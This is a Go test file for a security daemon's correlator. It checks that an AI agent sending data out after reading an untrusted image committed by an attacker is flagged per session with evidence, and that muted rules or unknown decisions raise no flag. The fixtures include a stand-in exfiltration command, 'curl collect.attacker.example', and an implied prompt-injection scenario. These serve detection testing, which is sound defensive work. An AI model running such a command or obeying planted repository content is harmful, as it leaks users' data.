package correlate

import (
	"testing"
	"time"

	"github.com/cavi-ai/secure-agent/daemon/internal/event"
	"github.com/cavi-ai/secure-agent/daemon/internal/model"
)

const untrustedOrigin = "committed by Mallory <mallory@attacker.example> in repo@c405510 on 2026-10-28 (docs: add build spec diagram)"

func untrustedSend(session, decision string, at time.Time) event.Event {
	return event.Event{
		Kind: event.KindPluginAction, TS: at, SessionID: session,
		Path: "guard-monitor:untrusted-egress", Detail: "secret-guard:allow",
		Untrusted: &model.UntrustedEgress{
			Decision: decision, Sinks: "curl collect.attacker.example", Harness: "claude",
			Sources: []model.UntrustedInput{{
				TS: "2026-10-28T19:57:24.199392+00:00", Kind: "image", Tool: "Read",
				Location: "/work/repo/docs/build-spec.png", Origin: untrustedOrigin,
			}},
		},
	}
}

// A send after untrusted input raises one finding per session that names
// the input, who sent it, the send and the guard's decision; later sends fold
// into it.
func TestUntrustedEgressFlag(t *testing.T) {
	var repeats []string
	c := newTestCorrelatorWith(t, Hooks{OnRepeat: func(id string, _ time.Time) { repeats = append(repeats, id) }})
	base := time.Date(2026, 10, 28, 19, 57, 25, 0, time.UTC)

	flags := c.Observe(untrustedSend("s-1", "monitored", base))
	if len(flags) != 1 {
		t.Fatalf("want 1 flag, got %+v", flags)
	}
	f := flags[0]
	if f.Rule != "untrusted-egress" || f.Severity != 2 || f.Agent != "claude" || f.SessionID != "s-1" {
		t.Fatalf("flag = rule %q sev %d agent %q session %q", f.Rule, f.Severity, f.Agent, f.SessionID)
	}
	want := []model.EvidenceItem{
		{Kind: "untrusted-input", Label: "Image: /work/repo/docs/build-spec.png", Sub: untrustedOrigin, Rule: "image", TS: "2026-10-28T19:57:24Z"},
		{Kind: "send", Label: "curl collect.attacker.example", Sub: "ran; monitor mode records it", Rule: "monitored", TS: "2026-10-28T19:57:25Z"},
	}
	if len(f.Evidence) != len(want) {
		t.Fatalf("evidence = %+v", f.Evidence)
	}
	for i, w := range want {
		got := f.Evidence[i]
		if got.Kind != w.Kind || got.Label != w.Label || got.Sub != w.Sub || got.Rule != w.Rule || got.TS != w.TS {
			t.Fatalf("evidence[%d] = %+v, want %+v", i, got, w)
		}
	}

	if again := c.Observe(untrustedSend("s-1", "monitored", base.Add(5*time.Minute))); len(again) != 0 {
		t.Fatalf("a later send in the session must fold, got %+v", again)
	}
	if len(repeats) != 1 || repeats[0] != f.ID {
		t.Fatalf("repeats = %v, want [%s]", repeats, f.ID)
	}

	other := c.Observe(untrustedSend("s-2", "denied", base))
	if len(other) != 1 || other[0].Severity != 1 || other[0].Evidence[1].Sub != "blocked" {
		t.Fatalf("a blocked send in another session = %+v", other)
	}

	// An unknown decision, a record without a session and a muted rule raise
	// nothing.
	if f := c.Observe(untrustedSend("s-3", "approved", base)); len(f) != 0 {
		t.Fatalf("unknown decision raised %+v", f)
	}
	if f := c.Observe(untrustedSend("", "monitored", base)); len(f) != 0 {
		t.Fatalf("record without a session raised %+v", f)
	}
	muted := newTestCorrelatorWith(t, Hooks{Muted: func(rule, host, agent string) bool {
		return rule == "untrusted-egress" && host == "*" && agent == "claude"
	}})
	if f := muted.Observe(untrustedSend("s-1", "monitored", base)); len(f) != 0 {
		t.Fatalf("muted rule raised %+v", f)
	}
}
